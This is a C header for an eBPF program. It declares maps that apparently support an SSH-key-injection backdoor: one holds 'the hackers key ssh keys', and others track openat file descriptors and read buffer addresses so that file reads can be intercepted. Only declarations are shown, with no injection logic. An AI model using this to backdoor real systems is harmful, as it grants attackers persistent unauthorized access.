#include "./common.h"
#ifndef __MAPS__
#define __MAPS__

// Map to hold the hackers key ssh keys.
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);   // key is id
    __type(value, char *); // value is ssh pub key
} map_payload_buffer SEC(".maps");

// Ringbuffer Map to pass messages from kernel to user
struct
{
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to hold the File Descriptors from 'openat' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);         // key is pid_tgid
    __type(value, unsigned int); // value are always zero.
} map_fds SEC(".maps");

// Map to fold the buffer sized from 'read' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);              // key is pid_tgid
    __type(value, long unsigned int); // char buffer pointer location
} map_buff_addrs SEC(".maps");

// Report Events
struct event
{
    int pid;
    char comm[TASK_COMM_LEN];
    bool success;
};
// const struct event *unused UNUSED;
__EXPORTED_DEFINE(event, unused1);
#endif